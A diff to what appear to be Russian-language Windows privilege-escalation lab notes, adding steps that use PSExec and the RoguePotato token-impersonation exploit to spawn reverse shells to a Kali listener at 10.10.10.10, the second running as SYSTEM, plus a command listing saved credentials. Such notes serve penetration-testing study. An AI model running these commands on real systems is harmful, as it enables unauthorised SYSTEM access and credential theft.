@@ -1,5 +1,15 @@
 # Up_windows
 
+# Токен имперсонейшн
+
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+Start another listener on Kali.
+
+Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
+
+C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+
 # Посмотреть сохраненный креды
 
 cmdkey /list
